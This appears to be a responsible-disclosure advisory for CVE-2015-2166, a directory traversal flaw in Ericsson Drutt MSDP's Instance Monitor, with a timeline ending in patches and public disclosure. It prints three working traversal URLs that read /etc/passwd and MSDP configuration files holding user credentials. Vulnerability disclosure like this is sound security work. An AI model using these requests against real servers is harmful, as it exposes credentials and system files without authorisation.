@@ -1,0 +1,39 @@
++------------------------------------------------------------------------------------------------------+
++ Ericsson Drutt MSDP (Instance Monitor) - Directory Traversal Vulnerability and Arbitrary File Access +
++------------------------------------------------------------------------------------------------------+
+Affected Product: Ericsson Drutt MSDP (Instance Monitor)
+Vendor Homepage  : www.ericsson.com
+Version    : 4, 5 and 6 
+CVE v2 Vector  : AV:N/AC:L/Au:N/C:P/I:N/A:N
+CVE    : CVE-2015-2166
+Discovered by  : Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
+Patched    : Yes
+
++-------------+
++ Description +
++-------------+
+Ericsson Drutt Mobile Service Delivery Platform (MSDP) is a complete business support system providing an SDP center for both on- and off-portal business that includes support for the retail, advertising and wholesale of a wide range of different products and services. The MSDP was originally developed by Drutt Corporation which Ericsson bought back in 2007. Drutt was converted into Ericsson SA SD&P and they are still developing the MSDP. The platform is available in three configurations which also can be combined in the same installation: Storefront, Mobile Marketing and Open Surf.
+
+The identified vulnerability affects the Instance Monitor component and allows a unauthenticated remote attacker to access arbitrary files on the file system. 
+
++----------------------+
++ Exploitation Details +
++----------------------+
+This vulnerability can be triggered via a simple, similar to the below HTTP GET request(s):
+
+  http://<drutt>:<port>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+  http://<drutt>:<port>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopt/drutt/msdp/manager/conf/props/msdp-users.properties
+  http://<drutt>:<port>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/opt/drutt/msdp/manager/conf/ccContext.properties
+
++---------------------+
++ Disclosure Timeline +
++---------------------+
+17.Feb.2015 - Contacted Ericsson http://www.ericsson.com/feedback
+24.Feb.2015 - Ericsson responded with point of contact at Corporate Security Office
+24.Feb.2015 - Contacted Corporate Security Office team
+02.Mar.2015 - Ericsson Product Security Incident Response Team reverted via a secure channel
+02.Mar.2015 - Shared vulnerability details
+06.Mar.2015 - Ericsson confirmed the validity of the issues and started developing the patches
+08.Mar.2015 - Agreed on public disclosure timelines
+12.Mar.2015 - Patches released
+31.Mar.2015 - Public disclosure
